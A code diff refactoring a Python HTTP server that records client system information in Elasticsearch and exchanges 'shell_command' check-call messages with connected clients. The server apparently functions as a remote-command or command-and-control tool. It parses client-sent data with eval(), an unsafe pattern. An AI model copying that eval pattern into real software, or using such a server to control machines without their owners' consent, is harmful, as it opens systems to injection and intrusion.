@@ -18,6 +18,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
 
 
+
     @staticmethod
     def convert_text(text):
             RESET = "\033[0m"
@@ -70,12 +71,9 @@ class MyHandler(BaseHTTPRequestHandler):
         sys_info = eval(sys_info.replace("'", "\"")) # Convert the string to a Python dictionary
         sys_info.update({"ip": str(client_ip)}) #update ip fields with client IP
         mac_address = sys_info.get('mac-address')
-        
-        if MyHandler.es_handler.is_client_present(mac_address):
-            MyHandler.es_handler.update_document(mac_address, sys_info)
-        else:
-            MyHandler.es_handler.store_client_information(sys_info)
+        self.upate_or_store_client_info(mac_address, sys_info)
 
+            
 
 
     def get_action_value(self, client_data):
@@ -108,7 +106,12 @@ class MyHandler(BaseHTTPRequestHandler):
                 data_value = client_dict.get("data", {})
                 print("Data Value:" + str(data_value))
                 data_value['ip'] = client_ip
-                MyHandler.es_handler.store_client_information(data_value)
+
+                #check if client is present
+                self.upate_or_store_client_info(data_value['mac-address'], data_value)
+
+                
+                
 
             else:
                 print(f"Unknown action: {action}")
@@ -123,10 +126,21 @@ class MyHandler(BaseHTTPRequestHandler):
                 # check call response
                 elif hasattr(MyHandler, 'shell_command') and MyHandler.shell_command == "connected":
                     if str(client_post["rfile"][0]) == "active":
-                        print("Active")
+                        print("Client Response: Active")
+                        self.check_call_response = True
+
                 else:
                     print(str(client_post["rfile"][0]))
 
+
+
+    def upate_or_store_client_info(self, mac_address, client_info):
+        #check if client is present
+        if MyHandler.es_handler.is_client_present(mac_address):
+            MyHandler.es_handler.update_document(mac_address, client_info)
+        else:
+            MyHandler.es_handler.store_client_information(client_info)
+       
 
  
 
@@ -166,9 +180,8 @@ class MyHandler(BaseHTTPRequestHandler):
 
 
 
-    #fix this code not to lag 
+    #send check call command to client 
     def send_check_call_command(self, client_ip):
-
         # Set a timeout of 5 seconds
         timeout = 5  
         # Wait for the response from the client with a timeout
@@ -181,9 +194,9 @@ class MyHandler(BaseHTTPRequestHandler):
             with MyHandler.input_ready:
                 MyHandler.shell_command = "connected"
                 MyHandler.input_ready.notify()
-                response_received = True
-               
+                break
 
+        return self.check_call_response
 
 
 
